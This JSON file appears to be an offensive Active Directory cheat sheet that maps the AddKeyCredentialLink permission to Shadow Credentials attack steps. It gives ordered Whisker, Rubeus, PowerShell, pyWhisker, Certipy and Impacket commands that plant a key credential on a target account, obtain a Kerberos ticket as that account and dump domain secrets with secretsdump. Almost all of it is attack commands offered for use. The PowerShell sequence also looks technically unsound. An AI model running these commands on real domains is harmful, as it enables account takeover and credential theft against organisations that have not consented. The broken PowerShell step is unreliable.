{
    "AddKeyCredentialLink": {
        "meaning": "The ability to write to the \"msds-KeyCredentialLink\" property on a user or computer. Writing to this property allows an attacker to create \"Shadow Credentials\" on the object and authenticate as the principal using kerberos PKINIT.",
        "common": "",
        "windows": {
            "Whisker": [
                {
                    "order": 1,
                    "command": "Whisker.exe add /target:<TargetPrincipal>",
                    "description": "Add shadow credential to target principal using Whisker"
                },
                {
                    "order": 2,
                    "command": "Whisker.exe list /target:<TargetPrincipal>",
                    "description": "List existing key credentials for target principal"
                },
                {
                    "order": 3,
                    "command": "Rubeus.exe asktgt /user:<TargetPrincipal> /certificate:<Base64Certificate> /password:<CertificatePassword> /domain:<Domain> /dc:<DomainController> /getcredentials /show",
                    "description": "Request TGT using shadow credential certificate"
                }
            ],
            "PowerShell": [
                {
                    "order": 1,
                    "command": "Import-Module ActiveDirectory",
                    "description": "Import Active Directory PowerShell module"
                },
                {
                    "order": 2,
                    "command": "$cert = New-SelfSignedCertificate -Subject \"CN=ShadowCred\" -KeyAlgorithm RSA -KeyLength 2048 -NotAfter (Get-Date).AddYears(1)",
                    "description": "Create self-signed certificate for shadow credential"
                },
                {
                    "order": 3,
                    "command": "$keyCredential = [Convert]::ToBase64String($cert.RawData)",
                    "description": "Convert certificate to base64 for msDS-KeyCredentialLink"
                },
                {
                    "order": 4,
                    "command": "Set-ADUser -Identity <TargetUser> -Add @{'msDS-KeyCredentialLink' = $keyCredential}",
                    "description": "Add shadow credential to target user's msDS-KeyCredentialLink attribute"
                }
            ]
        },
        "linux": {
            "pyWhisker": [
                {
                    "order": 1,
                    "command": "python3 pywhisker.py -d domain.com -u attacker -p password --target targetuser --action add",
                    "description": "Add shadow credential using pyWhisker"
                },
                {
                    "order": 2,
                    "command": "python3 pywhisker.py -d domain.com -u attacker -p password --target targetuser --action list",
                    "description": "List existing shadow credentials for target"
                },
                {
                    "order": 3,
                    "command": "python3 gettgtpkinit.py domain.com/targetuser -cert-pfx shadow_cred.pfx -pfx-pass password",
                    "description": "Request TGT using shadow credential certificate"
                }
            ],
            "Certipy": [
                {
                    "order": 1,
                    "command": "certipy shadow auto -username attacker@domain.com -password password -account targetuser",
                    "description": "Automatically perform shadow credential attack using Certipy"
                }
            ],
            "Impacket": [
                {
                    "order": 1,
                    "command": "python3 getTGT.py -dc-ip DC_IP domain.com/targetuser -hashes :hash",
                    "description": "Get TGT after shadow credential authentication"
                },
                {
                    "order": 2,
                    "command": "export KRB5CCNAME=targetuser.ccache",
                    "description": "Set Kerberos credentials cache"
                },
                {
                    "order": 3,
                    "command": "python3 secretsdump.py -k -no-pass domain.com/targetuser@DC_IP",
                    "description": "Dump secrets using Kerberos authentication"
                }
            ]
        }
    }
}
